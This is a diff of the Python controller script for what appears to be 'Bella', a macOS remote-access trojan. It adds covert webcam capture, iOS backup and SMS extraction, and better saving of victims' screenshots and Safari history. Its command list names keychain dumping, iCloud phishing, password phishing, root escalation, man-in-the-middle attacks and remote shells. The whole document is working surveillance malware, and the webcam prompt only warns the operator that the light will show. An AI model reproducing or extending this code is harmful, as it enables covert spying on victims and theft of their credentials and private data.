@@ -19,12 +19,12 @@ ps1Green = '\033[1;32m'
 offGreen = '\033[36m' #light blue lol
 offBlue = '\033[38;5;148m'
 purple = '\033[0;35m'
-redX = "%s[x] %s" % (red, endC)
+redX = "%s[-] %s" % (red, endC)
 greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'update_db_entry', 'volume', 'version', 'set_client_name', 'host_update', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'update_db_entry', 'iOS_sms', 'webcam', 'volume', 'version', 'set_client_name', 'host_update', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def subprocess_cleanup(subprocess_list):
     if len(subprocess_list) > 0:
@@ -261,7 +261,7 @@ def main():
             now = datetime.datetime.now()
 
         next_msg_is_fxn_data = (False, '')
-        fxn_headers = ['C5EBDE1F', 'downloader', 'keychain_download', '6E87CF0B']
+        fxn_headers = ['C5EBDE1F', 'downloader', 'keychain_download', '6E87CF0B', 'FFA82F16']
         
         while active:
             try:
@@ -387,12 +387,29 @@ def main():
                     if screen == "error":
                         print "%sError capturing screenshot!" % redX
                     else:
-                        fancyTime = time.strftime("_%m-%d_%H_%M_%S")
-                        os.system("mkdir -p %sScreenshots" % client_log_path)
-                        with open("%sScreenshots/screenShot%s.png" % (client_log_path, fancyTime), "w") as shot:
+                        if not os.path.isdir('%sScreenshots' % client_log_path):
+                            os.makedirs('%sScreenshots' % client_log_path)
+                        fancyTime = time.strftime("%m-%d_%H_%M_%S")
+                        with open("%sScreenshots/%s.png" % (client_log_path, fancyTime), "w") as shot:
                             shot.write(base64.b64decode(screen))
                         time.sleep(1)
-                        print "%sGot screenshot [%s]" % (greenCheck, fancyTime)
+                        print "%sSaved screenshot to [%sScreenshots/%s.png]" % (greenCheck, client_log_path, fancyTime)
+
+                elif data.startswith('webcam_coming_over'):
+                    screen = data.split(':::')[1]
+                    if not os.path.isdir('%sWebcam' % client_log_path):
+                        os.makedirs("%sWebcam" % client_log_path)
+                    fancyTime = time.strftime("%m-%d_%H_%M_%S")
+                    with open("%sWebcam/%s.jpg" % (client_log_path, fancyTime), "w") as shot:
+                        shot.write(base64.b64decode(screen))
+                    print "%sSaved webcam shot to [%sWebcam/%s.jpg]" % (greenCheck, client_log_path, fancyTime)
+
+                elif data.startswith('FFA82F16'):
+                    deserialize = data[8:].split('FFA82F16_tuple')
+                    for x in deserialize:
+                        (name, data, backup_name) = x.split('FFA82F16')
+                        downloader(data, backup_name, client_log_path, client_name, 'iOSBackups/%s' % name)
+                    print '%sGot iOS Backups' % greenCheck
 
                 elif data.startswith('C5EBDE1F'):
                     deserialize = data[8:].split('C5EBDE1F_tuple')
@@ -404,9 +421,12 @@ def main():
                 elif data.startswith('6E87CF0B'):
                     deserialize = data[8:].split('6E87CF0B_tuple')
                     for x in deserialize:
-                        (name, data) = x.split('6E87CF0B') #name will be the user, which we're going to want on the path
-                        downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
-                    print "%sGot Safari History" % greenCheck
+                        try:
+                            (name, data) = x.split('6E87CF0B') #name will be the user, which we're going to want on the path
+                            downloader(bz2.decompress(data), 'history_%s.txt' % time.strftime("%m-%d_%H_%M_%S"), client_log_path, client_name, 'Safari/%s' % name)
+                            print "%sGot Safari History" % greenCheck
+                        except ValueError as e: #no history found
+                            print '%sNo Safari History found.' % redX
 
                 elif data.startswith('lserlser'):
                     (rawfile_list, filePrint) = pickle.loads(data[8:]) 
@@ -559,6 +579,15 @@ def main():
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
+                    if nextcmd == "webcam":
+                        print "%sWARNING%s" % (red, endC)
+                        print "📸  This will activate the green webcam light for 1 second." 
+                        confirm = raw_input("Confirm that you would like to take a webcam picture (Y/n): ")
+                        if confirm.lower() == "y":
+                            nextcmd = "gogo_webcam"
+                        else:
+                            nextcmd = ""
+
                     if nextcmd == "update_db_entry":
                         db_entries = ['iCloud Password', 'User Password']
                         db_dict = ['applePass', 'localPass']
@@ -662,6 +691,9 @@ def main():
                         nextcmd = ""
                         if raw_input("Are you sure you want to shutdown the server?\nThis will unload all LaunchAgents: (Y/n) ").lower() == "y":
                             nextcmd = "shutdownserver_yes"
+
+                    if nextcmd == "iOS_sms":
+                        nextcmd = "iTunes_bk_sms_extract"
 
                     if nextcmd == "vnc":
                         if platform.system() == 'Linux':
